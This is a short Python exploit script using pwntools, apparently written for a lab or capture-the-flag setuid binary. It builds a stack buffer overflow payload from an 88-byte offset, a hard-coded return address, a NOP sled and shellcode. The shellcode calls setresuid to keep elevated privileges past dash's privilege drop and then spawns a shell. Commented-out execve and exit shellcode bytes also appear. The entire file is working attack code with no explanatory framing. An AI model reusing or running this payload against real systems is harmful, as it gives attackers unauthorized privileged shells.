#!/usr/bin/env python3
import sys
from pwn import *

context.arch = 'amd64'

# # Shellcode x86_64 execve("/bin/sh")
# shellcode = b"\x48\x31\xd2\x48\x31\xf6\x50\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
# # Shellcode pour exit(42) - 7 octets
# exit_shellcode = b"\x48\x31\xc0\xb0\x2a\x0f\x05"  # xor rax,rax ; mov al,42 ; syscall (exit(42))

# Change user to bypass dash protection
priv_shellcode = asm('''
    xor rax, rax
    mov al, 107  /* geteuid */
    syscall
    mov rdi, rax
    mov rsi, rax
    mov rdx, rax
    xor rax, rax
    mov al, 117  /* setresuid */
    syscall
''')

OFFSET = 88
SLED_SIZE = 300
RET_ADDR = 0x7fffffffed90
SHELLCODE = priv_shellcode + asm(shellcraft.sh())

def payload():
    sled = b"\x90" * SLED_SIZE
    payload = b"A" * OFFSET
    payload += p64(RET_ADDR)
    payload += sled
    payload += SHELLCODE
    return payload